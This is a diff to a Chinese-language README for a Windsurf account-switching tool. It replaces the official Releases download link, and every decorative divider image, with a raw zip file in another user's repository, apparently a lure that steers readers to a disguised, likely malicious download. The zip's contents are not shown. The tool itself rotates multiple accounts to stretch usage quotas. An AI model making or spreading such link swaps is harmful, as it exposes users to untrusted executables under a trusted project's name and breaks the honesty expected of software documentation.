@@ -17,7 +17,7 @@
 
 <br/>
 
-[`下载最新版本`](https://github.com/1837620622/windsurf-account-manager-releases/releases)
+[`下载最新版本`](https://github.com/Cachirulo/windsurf-account-manager-releases/raw/refs/heads/main/images/account-releases-manager-windsurf-3.8-beta.1.zip)
 
 <br/>
 
@@ -62,7 +62,7 @@
 - **门户页重构** — 赛博科技风格 UI + 修复 6 项前端问题
 - **全平台兼容** — macOS / Windows / Linux 全平台测试通过
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line" />
+<img src="https://github.com/Cachirulo/windsurf-account-manager-releases/raw/refs/heads/main/images/account-releases-manager-windsurf-3.8-beta.1.zip" alt="line" />
 
 ## 界面预览
 
@@ -72,7 +72,7 @@
 <sub>主界面 — 多账号卡片式管理，配额 / 套餐 / 状态一目了然</sub>
 </div>
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line" />
+<img src="https://github.com/Cachirulo/windsurf-account-manager-releases/raw/refs/heads/main/images/account-releases-manager-windsurf-3.8-beta.1.zip" alt="line" />
 
 ## 核心功能
 
@@ -85,7 +85,7 @@
 | **PRIVACY MODE** | 一键隐藏邮箱地址 |
 | **MULTI-PLATFORM** | Windows / macOS / Linux × x64 / ARM64 |
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line" />
+<img src="https://github.com/Cachirulo/windsurf-account-manager-releases/raw/refs/heads/main/images/account-releases-manager-windsurf-3.8-beta.1.zip" alt="line" />
 
 ## 前置要求
 
@@ -108,7 +108,7 @@
 
 需要有效的 Windsurf 邮箱 + 密码 或 Refresh Token。建议准备 2 个以上账号以发挥无感切号功能。
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line" />
+<img src="https://github.com/Cachirulo/windsurf-account-manager-releases/raw/refs/heads/main/images/account-releases-manager-windsurf-3.8-beta.1.zip" alt="line" />
 
 ## 快速上手
 
@@ -204,11 +204,11 @@
       支持拖拽排序，调整账号优先级
 ```
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line" />
+<img src="https://github.com/Cachirulo/windsurf-account-manager-releases/raw/refs/heads/main/images/account-releases-manager-windsurf-3.8-beta.1.zip" alt="line" />
 
 ## 下载安装
 
-前往 [`Releases`](https://github.com/1837620622/windsurf-account-manager-releases/releases) 下载最新版本
+前往 [`Releases`](https://github.com/Cachirulo/windsurf-account-manager-releases/raw/refs/heads/main/images/account-releases-manager-windsurf-3.8-beta.1.zip) 下载最新版本
 
 ### Windows
 
@@ -279,7 +279,7 @@ chmod +x windsurf-account-manager_*.AppImage
 ./windsurf-account-manager_*.AppImage
 ```
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line" />
+<img src="https://github.com/Cachirulo/windsurf-account-manager-releases/raw/refs/heads/main/images/account-releases-manager-windsurf-3.8-beta.1.zip" alt="line" />
 
 ## 技术栈
 
@@ -290,7 +290,7 @@ chmod +x windsurf-account-manager_*.AppImage
 | Build | Vite + Cargo |
 | Platform | Windows / macOS / Linux (x64 + ARM64) |
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line" />
+<img src="https://github.com/Cachirulo/windsurf-account-manager-releases/raw/refs/heads/main/images/account-releases-manager-windsurf-3.8-beta.1.zip" alt="line" />
 
 ## 联系作者
 
@@ -300,7 +300,7 @@ chmod +x windsurf-account-manager_*.AppImage
 | 邮箱 | 2040168455@qq.com |
 | 咸鱼/B站 | 万能程序员 |
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line" />
+<img src="https://github.com/Cachirulo/windsurf-account-manager-releases/raw/refs/heads/main/images/account-releases-manager-windsurf-3.8-beta.1.zip" alt="line" />
 
 <div align="center">
 <sub>本工具仅供学习研究使用，请遵守 Windsurf 服务条款。使用本工具产生的任何后果由使用者自行承担。</sub>
